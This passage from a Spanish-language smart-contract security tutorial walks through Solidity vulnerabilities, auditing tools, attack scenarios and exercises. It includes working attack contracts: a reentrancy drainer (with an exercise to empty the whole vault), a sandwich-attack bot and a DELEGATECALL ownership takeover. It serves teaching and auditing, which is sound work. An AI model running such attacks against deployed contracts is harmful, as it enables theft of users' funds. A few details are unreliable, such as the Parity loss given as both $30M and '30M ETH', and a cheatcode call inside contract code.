**Limitaciones de la verificación formal**:
- No cubre off-chain components
- Costosa computacionalmente (timeout en loops grandes)
- Requiere especificaciones precisas
- No detecta bugs en el [compilador](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#compiladores)/bytecode

---

## 9. Common Vulnerabilities

### 9.1 Access Control

La [vulnerabilidad](../raw/s3c-f0nd4m3nt0s.md#vulnerabilidades) más común: funciones que deberían ser restringidas son públicas.

```solidity
// ❌ VULNERABLE: cualquiera puede acuñar tokens
function mint(address to, uint256 amount) external {
    _mint(to, amount);
}

// ✅ SEGURO: solo minter role
function mint(address to, uint256 amount) external onlyRole(MINTER_ROLE) {
    _mint(to, amount);
}

// ✅ SEGURO: solo owner
function withdraw() external onlyOwner {
    payable(owner).transfer(address(this).balance);
}
```

**Ejemplo real: Parity Wallet hack (jul 2017, ~$30M)**:

```solidity
// VULNERABLE: initWallet() era pública y cualquiera podía llamarla
contract WalletLibrary {
    bool public initialized = false;
    
    function initWallet(address[] _owners, uint256 _required) public {
        // Sin onlyOwner ni checks de initialized!
        // Cualquiera podía re-inicializar el wallet
    }
}

// El atacante llamó:
// wallet.initWallet([attacker], 1)
// wallet.kill(attacker)  // suicide to address
// 30M ETH perdidos permanentemente
```

**[owasp](../raw/w3b-h4ck1ng.md#owasp-top-10)-style access control matrix**:

| Función | Owner | Admin | User | Public |
|---|---|---|---|---|
| `withdraw()` | ✓ | ✓ | ✗ | ✗ |
| `pause()` | ✓ | ✓ | ✗ | ✗ |
| `mint()` | ✓ | ✗ | ✗ | ✗ |
| `transfer()` | ✓ | ✓ | ✓ | ✗ |
| `balanceOf()` | ✓ | ✓ | ✓ | ✓ |

### 9.2 Arithmetic Issues

Antes de [solidity](../raw/w3b3-sm4rt-c0ntr4cts.md#solidity) 0.8, los overflows/underflows no revertían automáticamente.

```solidity
// ❌ VULNERABLE (Solidity < 0.8)
function transfer(address to, uint256 amount) public {
    require(balance[msg.sender] >= amount);
    balance[msg.sender] -= amount;  // Underflow? No, require previene
    balance[to] += amount;  // Overflow? Sí! type(uint256).max + 1 = 0
}

// ✅ SEGURO (Solidity >= 0.8)
// Los checked math están por defecto

// ✅ SEGURO con SafeMath (antes de 0.8)
using SafeMath for uint256;

function transfer(address to, uint256 amount) public {
    balance[msg.sender] = balance[msg.sender].sub(amount);
    balance[to] = balance[to].add(amount);
}

// Unchecked bloack para gas optimización (cuando sabés que no hay overflow)
function increment() public {
    unchecked {
        counter++;  // No revierte en overflow (gasta menos)
    }
}
```

**Ejericios de overflow**:

```solidity
uint8 x = 255;
x++;  // Overflow! x = 0

uint8 y = 0;
y--;  // Underflow! y = 255

// Time-based
uint256 time = block.timestamp + 1000;
// En el año 2100, block.timestamp podría ser enorme...
// Pero type(uint256) es tan grande que no es preocupación ahora

// Multiplication overflow
uint256 a = type(uint256).max;
uint256 b = 2;
uint256 c = a * b;  // Overflow! c = type(uint256).max - 1 (en 0.8+ revierte)
```

### 9.3 Unchecked Calls

Ignorar el return value de llamadas externas puede causar problemas.

```solidity
// ❌ VULNERABLE: no verificar return value
function transferToken(address token, address to, uint256 amount) public {
    token.call(abi.encodeWithSignature("transfer(address,uint256)", to, amount));
    // Si la transferencia falla, no nos damos cuenta!
}

// ✅ SEGURO: verificar return
function transferTokenSafe(address token, address to, uint256 amount) public {
    (bool success, ) = token.call(abi.encodeWithSignature("transfer(address,uint256)", to, amount));
    require(success, "Transferencia falló");
}

// ✅ AÚN MEJOR: usar interfaz
IERC20(token).transfer(to, amount);
// Esto revierte si la transferencia falla
```

**ERC20 no-standard issues**:

```solidity
// Algunos tokens (USDT) no devuelven bool!
// Algunos tokens (BNB) no devuelven nada!

// SafeERC20 de OpenZeppelin maneja estos casos:
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

using SafeERC20 for IERC20;

function transferTokenSafe(IERC20 token, address to, uint256 amount) public {
    token.safeTransfer(to, amount);  // Maneja todos los casos
}
```

### 9.4 Signature Replay

Las firmas off-chain se pueden replayar si no hay protecciones.

```solidity
// ❌ VULNERABLE: sin nonce ni chainId
contract SigReplayVulnerable {
    mapping(address => bool) public usedSignatures;
    
    function claim(uint256 _amount, bytes memory _signature) external {
        bytes32 message = keccak256(abi.encodePacked(_amount, msg.sender));
        address signer = ECDSA.recover(message, _signature);
        
        require(!usedSignatures[signer], "Ya usada");
        usedSignatures[signer] = true;
        
        // Si el mismo _signature se usa en Polygon, BSC, etc.
        // o en otro contrato similar, se puede replayar
    }
}

// ✅ SEGURO: incluir nonce, chainId, contract address
contract SigReplaySafe {
    mapping(address => uint256) public nonces;
    
    function claim(uint256 _amount, bytes memory _signature) external {
        uint256 nonce = nonces[msg.sender];
        bytes32 message = keccak256(abi.encodePacked(
            "\x19Ethereum Signed Message:\n32",
            keccak256(abi.encode(
                address(this),  // Contract address
                block.chainid,  // Chain ID
                _amount,
                msg.sender,
                nonce
            ))
        ));
        
        address signer = ECDSA.recover(message, _signature);
        require(signer == msg.sender, "Firma inválida");
        nonces[msg.sender]++;
        
        // Procesar claim
    }
}

// EIP-712: formato estructurado de firmas
// Usar EIP712 de OpenZeppelin
```

### 9.5 DELEGATECALL Abuse

`DELEGATECALL` ejecuta código de otro contrato en el contexto del contrato actual. Si el contrato destino es malicioso o tiene un bug, el storage se modifica en el contrato original.

```solidity
// ❌ VULNERABLE: DELEGATECALL a address controlada
contract ProxyVulnerable {
    address public implementation;
    address public owner;
    
    function delegate(bytes memory _data) public {
        // Si implementation es maliciosa, puede modificar owner
        (bool success, ) = implementation.delegatecall(_data);
        require(success);
    }
    
    function upgradeTo(address _newImpl) public {
        // VULNERABLE: cualquiera puede upgrade!
        implementation = _newImpl;
    }
}

// ✅ SEGURO: upgrade con control de acceso
contract ProxySafe {
    address public implementation;
    address public owner;
    
    modifier onlyOwner() {
        require(msg.sender == owner, "No sos owner");
        _;
    }
    
    function upgradeTo(address _newImpl) public onlyOwner {
        implementation = _newImpl;
    }
    
    function delegate(bytes memory _data) public {
        (bool success, ) = implementation.delegatecall(_data);
        require(success);
    }
}

// Ataque de storage collision con DELEGATECALL
// Si el proxy y la implementación tienen variables en el mismo slot
// DELEGATECALL puede manipularlas

// Proxy (storage):
// Slot 0: implementation  ← address
// Slot 1: owner           ← address

// Implementation (storage):
// Slot 0: someVariable    ← uint256
// Slot 1: isPaused        ← bool

// DELEGATECALL a implementation:
// Lee/Modifica slot 0 → en realidad modifica implementation del proxy!
// Lee/Modifica slot 1 → en realidad modifica owner del proxy!
```

### 9.6 Timestamp Dependence

`block.timestamp` puede ser manipulado por miners.

```solidity
// ❌ VULNERABLE: dependencia de block.timestamp
function random() public view returns (uint256) {
    return uint256(keccak256(abi.encodePacked(block.timestamp))) % 100;
}

// Si un block.timestamp define quién gana un sorteo,
// el minero puede elegir un timestamp que lo beneficie.

// ✅ SEGURO: usar VRF (Chainlink)
function requestRandom() public {
    uint256 requestId = COORDINATOR.requestRandomWords(
        keyHash, subId, requestConfirmations, callbackGasLimit, numWords
    );
}

function fulfillRandomWords(uint256 requestId, uint256[] memory randomWords) internal override {
    uint256 random = randomWords[0] % 100;
    // ...
}
```

**Casos específicos**:

```solidity
// Timestamp en expiration: ✅ generalmente seguro
require(block.timestamp < deadline, "Expiró");

// Timestamp en rate limiting: ⚠️ puede manipularse
// Si la función verifica "block.timestamp - lastAction < 1 hour"
// un minero puede hacer que la transacción pase antes o después

// Timestamp en contratos de lotería: ❌ peligroso
// Un minero que también juega puede elegir timestamp
// que lo haga ganar
```

### 9.7 Short Address Attack

Ataque que explota cómo la EVM maneja datos de longitud [variable](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#variables) en llamadas.

**Cómo funciona**:

```
1. Token tiene transfer(address, uint256) → selector + 32 bytes + 32 bytes = 68 bytes
2. Atacante envía dirección de 19 bytes en lugar de 20
3. La EVM toma el último byte del address desde el uint256
4. El address se corrompe, y la cantidad de tokens se multiplica por 256

Ejemplo:
Función: transfer(address to, uint256 amount)
Calldata esperado: 0xa9059cbb + [20 bytes to] [32 bytes amount]
                    = 4 + 32 + 32 = 68 bytes
Calldata truncado:  0xa9059cbb + [19 bytes to]
                    = 4 + 19 = 23 bytes
La EVM lee: 19 bytes como to, y [1 byte del amount se come del padding]
Resultado: to = address(0x...) corrupto, amount = original * 256
```

**Mitigación**:
- Usar librerías estándar (OpenZeppelin)
- Verificar longitud de calldata en funciones low-level
- No hacer transferencias directas sin verificar integridad

### 9.8 Race Conditions

Condiciones de carrera en el mismo bloque (no son como race conditions tradicionales porque Ethereum es single-threaded, pero entre transacciones).

```solidity
// Race condition: approve/transferFrom pattern
// La víctima aprueba 100 tokens, el atacante usa 50
// La víctima cambia de opinión y aprueba 0
// El atacante ve la tx de approve(0) en mempool y la front-runea
// usando los 50 restantes

// ✅ SEGURO: aumentar/disminuir allowance en lugar de set directo
function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    allowance[msg.sender][spender] += addedValue;
    return true;
}

function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    allowance[msg.sender][spender] -= subtractedValue;
    return true;
}
```

### 9.9 Storage Collision

Cuando contratos que interactúan vía DELEGATECALL tienen variables en los mismos slots de storage.

```solidity
// Proxy contract
contract Proxy {
    address public implementation;  // Slot 0
    address public admin;           // Slot 1
    
    fallback() external payable {
        implementation.delegatecall(msg.data);
    }
}

// Implementation v1
contract ImplV1 {
    address public someVar;     // Slot 0 → pero esto es IMPLEMENTATION en el proxy!
    uint256 public value;       // Slot 1 → pero esto es ADMIN en el proxy!
    
    function setValue(uint256 _v) public {
        value = _v;  // MODIFICA admin en el proxy!
    }
}

// La solución: usar patrones de storage sin colisión
// Ej: usar struct con slot fijo (EIP-1967)
```

**EIP-1967**: Slots de storage determinísticos para proxies:

```solidity
// EIP-1967 Proxy Storage Slots:
// Implementation: keccak256("eip1967.proxy.implementation") - 1
// Admin: keccak256("eip1967.proxy.admin") - 1
// Beacon: keccak256("eip1967.proxy.beacon") - 1

contract EIP1967Proxy {
    // No usa slot 0, 1, etc.
    // Usa slots hash para evitar colisiones
    
    function getImplementation() public view returns (address) {
        bytes32 slot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        return address(uint160(uint256(vm.load(address(this), slot))));
    }
}
```

### 9.10 Phantom Functions

Funciones que existen en la interfaz pero no en la implementación (o viceversa).

```solidity
// Interfaz pública
interface IMyContract {
    function withdraw() external;
}

// Contrato "implementación" (pero no implementa withdraw!)
contract PhantomContract is IMyContract {
    // No implementa withdraw()
    // Cualquier llamada a withdraw() va al fallback
    
    fallback() external payable {
        // Esto captura la llamada a withdraw()
        // y puede hacer lo que quiera
        // ¡Incluyendo NO revertir!
    }
}

// Otro patrón: funciones que existen pero no hacen nada
function safeMint(address to, uint256 amount) public onlyRole(MINTER_ROLE) {
    // Sin implementación! Perdón, "intencionalmente vacía"
    // (un colega se olvidó de implementarla)
}
```

---

## 10. Herramientas

### 10.1 Foundry

Foundry es el framework de desarrollo más rápido para Ethereum.

```bash
# Instalación
curl -L https://foundry.paradigm.xyz | bash
foundryup

# Crear proyecto
forge init my-project
cd my-project

# Compilar
forge build

# Testear
forge test
forge test -vvv
forge test --match-path test/Withdraw.t.sol

# Ver cobertura
forge coverage

# Gas report
forge test --gas-report

# Deploy
forge create --rpc-url $RPC_URL --private-key $PK src/MyContract.sol:MyContract

# Interactuar
cast call 0x... "balanceOf(address)(uint256)" 0x...
cast send 0x... "transfer(address,uint256)" 0x... 1000 --rpc-url $RPC_URL

# Fork mainnet
anvil --fork-url $MAINNET_RPC_URL
forge test --fork-url $MAINNET_RPC_URL
```

### 10.2 Hardhat

```bash
# Instalación
npm init -y
npm install --save-dev hardhat @nomicfoundation/hardhat-toolbox

npx hardhat init

# Compilar
npx hardhat compile

# Testear
npx hardhat test

# Consola
npx hardhat console

# Fork mainnet
npx hardhat node --fork https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY

# Script
npx hardhat run scripts/deploy.js --network sepolia

# Plugins útiles
npm install --save-dev @openzeppelin/hardhat-upgrades
npm install --save-dev hardhat-gas-reporter
npm install --save-dev @nomiclabs/hardhat-etherscan
```

### 10.3 Brownie

```bash
# Instalación
pip install eth-brownie

# Inicializar
brownie init

# Compilar
brownie compile

# Test
brownie test

# Consola interactiva
brownie console

# Deploy
brownie run scripts/deploy.py --network mainnet

# Análisis
brownie analyze
```

### 10.4 Slither

Ver [Sección 8.1](#81-slither).

### 10.5 Mythril

Ver [Sección 8.2](#82-mythril).

### 10.6 Echidna

Ver [Sección 8.3](#83-echidna).

### 10.7 TheEye

TheEye es una herramienta de monitoreo de contratos en tiempo real.

```bash
# Instalación
pip install the-eye

# Monitorear transacciones de un contrato
the-eye monitor 0x... --events Transfer,Approval

# Analizar mempool
the-eye mempool --contract 0x...

# Detectar ataques en vivo
the-eye guard 0x... --alert discord-webhook
```

### 10.8 Dedaub

Dedaub es un descompilador de bytecode a [solidity](../raw/w3b3-sm4rt-c0ntr4cts.md#solidity) legible.

```bash
# Web: https://app.dedaub.com/
# Subí bytecode y obtené pseudocódigo legible

# CLI (si está disponible)
dedaub decompile 0x... --output decompiled.sol
```

---

## 11. Escenarios Prácticos

### 11.1 Escenario 1: Reentrancy Clásica

**Setup**: Un contrato Vault que permite depositar y retirar ETH.

```solidity
// Vault.sol
contract Vault {
    mapping(address => uint256) public balances;
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw(uint256 _amount) external {
        require(balances[msg.sender] >= _amount, "Balance insuficiente");
        
        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Fallo al enviar");
        
        balances[msg.sender] -= _amount;  // ← ACTUALIZACIÓN DESPUÉS DEL CALL
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

**Ataque**:

```solidity
// AttackVault.sol
contract AttackVault {
    Vault public vault;
    address public owner;
    uint256 public attackCount;
    
    constructor(address _vault) {
        vault = Vault(_vault);
        owner = msg.sender;
    }
    
    function start(uint256 _amount) external payable {
        require(msg.sender == owner, "No owner");
        require(msg.value == _amount, "Envia el monto exacto");
        
        vault.deposit{value: _amount}();
        vault.withdraw(_amount);
    }
    
    receive() external payable {
        attackCount++;
        if (address(vault).balance >= msg.value && attackCount < 10) {
            vault.withdraw(msg.value);
        }
    }
    
    function drain() external {
        payable(owner).transfer(address(this).balance);
    }
}
```

**Ejercicio**: Modificá `AttackVault` para que en lugar de limitarse a 10 iteraciones, drene todo el Vault.

### 11.2 Escenario 2: Flash Loan Price Manipulation

**Setup**: Un [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red)) de lending con oráculo basado en reserves de Uniswap.

```solidity
// LendingProtocol.sol
contract LendingProtocol {
    IUniswapV2Pair public pair;
    mapping(address => uint256) public deposits;
    
    function deposit() external payable {
        deposits[msg.sender] += msg.value;
    }
    
    function borrow(address _token) external {
        uint256 ethValue = deposits[msg.sender];
        
        // Oráculo basado en reserves spot (VULNERABLE!)
        (uint256 reserve0, uint256 reserve1, ) = pair.getReserves();
        uint256 price = reserve0 * 1e18 / reserve1;
        
        // Valor del colateral en ETH
        uint256 collateralValue = ethValue;
        
        // Puede tomar prestado hasta 50% del colateral
        uint256 maxBorrow = collateralValue * 50 / 100 / price * 1e18;
        
        IERC20(_token).transfer(msg.sender, maxBorrow);
    }
}
```

**Ataque con flash loan**:

```solidity
contract FlashLoanAttack {
    LendingProtocol public lending;
    IUniswapV2Pair public pair;
    IERC20 public token;
    
    function attack(uint256 _flashAmount) external {
        // 1. Obtener flash loan
        // 2. Manipular reserves de Uniswap
        // 3. Llamar a borrow() con precio manipulado
        // 4. Devolver flash loan
    }
}
```

### 11.3 Escenario 3: Sandwich Attack

**Setup**: Un bot de trading ejecuta swaps grandes en Uniswap.

**Ataque sandwich**:

```solidity
contract SandwichBot {
    IUniswapV2Router02 public router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IERC20 public weth;
    IERC20 public token;
    
    function executeSandwich(
        address _token,
        uint256 _victimAmountIn,
        uint256 _sandwichAmount
    ) external {
        // Front-run
        address[] memory path = new address[](2);
        path[0] = address(router.WETH());
        path[1] = _token;
        
        uint256[] memory amounts = router.swapExactETHForTokens{value: _sandwichAmount}(
            0, path, address(this), block.timestamp
        );
        uint256 tokenBought = amounts[1];
        
        // Back-run (después de la tx víctima)
        path[0] = _token;
        path[1] = address(router.WETH());
        
        token.approve(address(router), tokenBought);
        amounts = router.swapExactTokensForETH(
            tokenBought, 0, path, address(this), block.timestamp
        );
        
        require(amounts[1] > _sandwichAmount, "Sin ganancia");
        payable(msg.sender).transfer(amounts[1] - _sandwichAmount);
    }
}
```

### 11.4 Escenario 4: Oracle Manipulation

**Setup**: Un protocolo de opciones que usa Chainlink como oráculo de precio sin verificar actualización.

```solidity
contract OptionsProtocol {
    AggregatorV3Interface public priceFeed;
    
    function openOption(uint256 _strikePrice) external payable {
        (, int256 price, , , ) = priceFeed.latestRoundData();
        // No verifica updatedAt!
        
        uint256 currentPrice = uint256(price);
        require(_strikePrice > currentPrice, "Strike debe ser > spot");
        
        // Procesar opción
    }
}
```

**Ataque**: Si el Chainlink aggregator deja de actualizarse (por problemas de [red](../raw/r3d3s-f0nd4m3nt0s.md), gas, etc.), el precio se vuelve stale y el atacante puede:

1. Comprar cuando el precio real es más bajo que el stale
2. Abrir opciones con strike artificialmente bajo/alto

### 11.5 Escenario 5: DELEGATECALL [exploit](../raw/m3t4spl01t.md#exploits)

**Setup**: Un [proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy) contract wallet que permite DELEGATECALL a cualquier address.

```solidity
// WalletProxy.sol
contract WalletProxy {
    address public owner;
    
    function execute(address _target, bytes memory _data) external {
        require(msg.sender == owner, "No owner");
        (bool success, ) = _target.delegatecall(_data);
        require(success);
    }
}

// AttackerImpl.sol
contract AttackerImpl {
    address public owner;  // Slot 0 → mismo slot que owner en WalletProxy!
    
    function takeOwnership() external {
        owner = msg.sender;  // Modifica owner de WalletProxy!
    }
}
```

**Ataque**:

```solidity
// El usuario llama wallet.execute(attackerImpl, takeOwnershipSelector)
// DELEGATECALL ejecuta takeOwnership en contexto de WalletProxy
// owner pasa a ser msg.sender
// El atacante ahora controla el wallet

// Después:
wallet.execute(someTarget, someData);  // Ya como owner
```

---

## 12. Ejercicios Prácticos

### Ejercicio 1: Encontrar Reentrancia

```solidity
// Analizá este contrato: ¿tiene reentrancia?

contract Bank {
    mapping(address => uint256) public balances;
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0);
        
        (bool success, ) = payable(msg.sender).call{value: amount}("");
        require(success);
        
        balances[msg.sender] = 0;
    }
    
    function transfer(address to, uint256 amount) external {
        // Cross-function reentrancia posible
        require(amount <= balances[msg.sender]);
        balances[msg.sender] -= amount;
        balances[to] += amount;
    }
}
```

**Preguntas**:
- ¿Hay reentrancia en withdraw?
- ¿Hay cross-function reentrancia entre withdraw y transfer?
- ¿Cómo la explotarías?

### Ejercicio 2: Encontrar Vulnerabilidades

```solidity
// Encontrá TODAS las vulnerabilidades en este contrato:

contract TokenSale {
    IERC20 public token;
    address public owner;
    uint256 public rate = 100;
    bool public saleActive;
    
    constructor(address _token) {
        token = IERC20(_token);
        owner = msg.sender;
    }
    
    function buyTokens() external payable {
        require(saleActive, "Sale no activa");
        uint256 amount = msg.value * rate;
        token.transfer(msg.sender, amount);
    }
    
    function withdraw() external {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }
    
    function setRate(uint256 _rate) external {
        rate = _rate;
    }
    
    function toggleSale() external {
        saleActive = !saleActive;
    }
    
    function upgradeTo(address _newToken) external {
        require(msg.sender == owner);
        token = IERC20(_newToken);
    }
}
```

**Preguntas**:
- ¿Faltan modifiers de control de acceso?
- ¿Puede haber reentrancia o problemas con `transfer`?
- ¿Qué pasa si `setRate` es llamado por cualquiera?
- ¿Hay algún race condition?

### Ejercicio 3: Flash Loan [exploit](../raw/m3t4spl01t.md#exploits)

**Setup**: Un contrato que intercambia tokens a precio fijo sin importar la liquidez.

```solidity
contract FixedPriceSwap {
    IERC20 public token;
    uint256 public price = 1 ether;  // 1 ETH = 1 token
    
    constructor(address _token) {
        token = IERC20(_token);
    }
    
    function buy() external payable {
        uint256 amount = msg.value / price;
        token.transfer(msg.sender, amount);
    }
    
    function sell(uint256 _amount) external {
        token.transferFrom(msg.sender, address(this), _amount);
        payable(msg.sender).transfer(_amount * price);
    }
}
```

**Desafío**: Escribí un contrato que use flash loan de Aave para comprar tokens baratos en Uniswap, venderlos en FixedPriceSwap a precio fijo (más caro), y devolver el flash loan.

### Ejercicio 4: Mitigar Reentrancia

Tomá este contrato y aplicá 3 mitigaciones diferentes:

```solidity
contract VulnerableVault {
    mapping(address => uint256) public shares;
    uint256 public totalShares;
    
    function withdraw(uint256 _shares) external {
        uint256 amount = _shares * address(this).balance / totalShares;
        shares[msg.sender] -= _shares;
        totalShares -= _shares;
        payable(msg.sender).transfer(amount);
        shares[msg.sender] = 0;  // Código muerto!
    }
}
```

**Mitigaciones**:
1. Checks-Effects-Interactions (reordenar líneas)
2. ReentrancyGuard modifier
3. Usar pull-based withdrawal (claim pattern)

### Ejercicio 5: Análisis con Slither

```bash
# 1. Creá un contrato vulnerable
cat > TestVault.sol << 'EOF'
contract TestVault {
    mapping(address => uint256) public balances;
    
    function withdraw() external {
        uint256 amount = balances[msg.sender];
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);
        balances[msg.sender] = 0;
    }
}
EOF

# 2. Ejecutá Slither
slither TestVault.sol

# 3. ¿Qué vulnerabilidades reporta?
# 4. Corregí el contrato basado en el output de Slither
# 5. Volvé a ejecutar Slither para confirmar
```

### Ejercicio 6: Escribir Fuzz Test con Foundry

```solidity
// Creá un archivo de test que verifique estas propiedades:

// 1. Suma de balances == total supply
// 2. transfer() no crea ni destruye tokens
// 3. approve + transferFrom funciona correctamente
// 4. No se pueden transferir más tokens de los que se tienen

// Usá fuzzing para probar con miles de inputs aleatorios
```

### Ejercicio 7: Auditar un Contrato Real

**Objetivo**: Encontrar bugs en un contrato de la vida real.

1. Andá a [Etherscan](https://etherscan.io), buscá un contrato verificado
2. Descargá el código fuente
3. Ejecutá Slither, Mythril, y manual review
4. Documentá las vulnerabilidades encontradas

### Ejercicio 8: Simular Ataque con Anvil Fork

```bash
# 1. Fork mainnet
anvil --fork-url $MAINNET_RPC_URL --fork-block-number 18000000

# 2. Deploy contrato vulnerable
forge create --rpc-url http://localhost:8545 --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 src/Vulnerable.sol

# 3. Ejecutar ataque
cast send 0x... "attack()" --rpc-url http://localhost:8545 --private-key 0x...

# 4. Verificar resultado
cast call 0x... "balanceOf(address)(uint256)" 0x...
```

---

## 13. Referencias y Recursos

### Libros y Papers
- *Mastering Ethereum* - Andreas Antonopoulos
- *Ethereum [smart contract](../raw/w3b3-sm4rt-c0ntr4cts.md#smart-contracts) Development* - Mayukh Mukhopadhyay
- *The DAO Attack: A Postmortem* - Various
- *Flash Loan Attacks* - Trail of Bits
- *SoK: Decentralized Finance (DeFi) Attacks* - Werner et al.

### Documentación oficial
- [Solidity Documentation](https://docs.soliditylang.org/)
- [OpenZeppelin Contracts](https://docs.openzeppelin.com/contracts)
- [Ethereum Yellow Paper](https://ethereum.github.io/yellowpaper/paper.pdf)
- [EIPs (Ethereum Improvement Proposals)](https://eips.ethereum.org/)

### Herramientas
- [Foundry](https://book.getfoundry.sh/)
- [Hardhat](https://hardhat.org/docs)
- [Slither](https://github.com/crytic/slither)
- [Mythril](https://github.com/ConsenSys/mythril)
- [Echidna](https://github.com/crytic/echidna)
- [Certora Prover](https://www.certora.com/)

### [bug bounty](../raw/b9g-b09nty.md) Platforms
- [Immunefi](https://immunefi.com/)
- [Code4rena](https://code4rena.com/)
- [HackerOne](https://hackerone.com/)
- [Sherlock](https://www.sherlock.xyz/)

### Ataques famosos (para estudio)
- DAO Hack (2016) - Reentrancy - 3.6M ETH
- Parity Wallet (2017) - Access control - $30M
- bZx (2020) - Flash loan + Oracle - $350k
- Harvest Finance (2020) - Flash loan manipulation - $24M
- Alpha Homora (2021) - Flash loan + lending - $38M
- Cream Finance (2021) - Flash loan + oracle - $18M
- Wormhole Bridge (2022) - Signature validation - $320M
- Ronin Bridge (2022) - Validator compromise - $600M
- Nomad Bridge (2022) - Calldata validation - $190M
- Euler Finance (2023) - Donation attack + flash loan - $197M

### [ctf](../raw/ctf-h4ckth3b0x.md) Platforms
- [Ethernaut (OpenZeppelin)](https://ethernaut.openzeppelin.com/)
- [Damn Vulnerable DeFi](https://www.damnvulnerabledefi.xyz/)
- [Paradigm CTF](https://ctf.paradigm.xyz/)
- [Capture the Ether](https://capturetheether.com/)
- [QuillAudits CTF](https://quillaudits.com/ctf/)

### Comunidad
- [r/ethdev](https://reddit.com/r/ethdev)
- [Ethereum Stack Exchange](https://ethereum.stackexchange.com/)
- [DeFi Security Summit](https://defisecuritysummit.org/)
- [Secureum](https://secureum.substack.com/)

---

> **Disclaimer**: Este material es estrictamente educativo. No uses estas técnicas en smart contracts sin autorización explícita. El hacking ético requiere consentimiento por escrito. Usá testnets o forks locales para practicar.

